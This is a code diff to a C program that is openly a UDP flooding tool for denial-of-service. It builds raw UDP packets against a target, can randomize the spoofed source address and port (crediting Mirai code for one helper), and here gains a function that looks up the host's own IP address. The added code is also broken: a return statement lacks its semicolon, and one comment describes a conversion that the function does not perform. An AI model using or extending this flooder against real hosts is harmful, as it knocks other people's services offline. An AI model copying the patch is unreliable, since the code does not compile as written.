@@ -19,6 +19,13 @@ License: MIT
 #include <time.h>
 #include <linux/if_ether.h>
 
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+
 #define DEBUG 1 // Set verbosity
 #define DELAY 0 // Set delay between packets in seconds
 #define RAND_SRC_ADDR 0 // Toggle source address randomization
@@ -226,6 +233,38 @@ static void update_udp_csum(struct iphdr* iph, struct udphdr* udph, __be32 old_s
 	sum = (sum & 0xffff) + (sum>>16);
 	udph->check = htons(sum + (sum>>16) + 1);
 }
+ 
+// Converts space-delimited IPv4 addresses
+// to dotted-decimal format
+void checkIPbuffer(char *IPbuffer)
+{
+    if (NULL == IPbuffer)
+    {
+        perror("inet_ntoa");
+        exit(1);
+    }
+}
+
+char* get_default_src_addr(void) {
+	char hostbuffer[256];
+    int hostname;
+	struct hostent *host_entry;
+	char *IPbuffer;
+ 
+    // To retrieve hostname
+    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+    if (hostname == -1) {
+		return "127.0.0.1";
+	}
+
+    host_entry = gethostbyname(hostbuffer);
+	if (host_entry == NULL) {
+		return "127.0.0.1";
+	} 
+
+    IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
+    return IPbuffer
+}
 
 static uint32_t random_ipv4(void) {
 	// Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
@@ -302,7 +341,7 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 
 int main(int argc, char *argv[]) {
 	// Create a raw socket
-	int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
+	int s = socket (AF_INET, SOCK_RAW, IPPROTO_UDP);
 
 	if(s == -1) {
 		// Socket creation failed, may be because of non-root privileges
@@ -326,21 +365,23 @@ int main(int argc, char *argv[]) {
 		exit(1);
 	}
 
-#if DEBUG
-	printf ("Flooding target %s:%u\n", dst_addr, dst_port);
+	default_src_addr = get_default_src_addr();
 
-	#if RAND_SRC_ADDR
-		printf("Randomizing source address\n");
-	#else
-		printf("Using source address %s\n", default_src_addr);
-	#endif
+	#if DEBUG
+		printf ("Flooding target %s:%u\n", dst_addr, dst_port);
 
-	#if RAND_SRC_PORT
-		printf("Randomizing source port\n");
-	#else
-		printf("Using source port %u\n", default_src_port);
+		#if RAND_SRC_ADDR
+			printf("Randomizing source address\n");
+		#else
+			printf("Using source address %s\n", default_src_addr);
+		#endif
+
+		#if RAND_SRC_PORT
+			printf("Randomizing source port\n");
+		#else
+			printf("Using source port %u\n", default_src_port);
+		#endif
 	#endif
-#endif
 
 
 	// Seed RNG
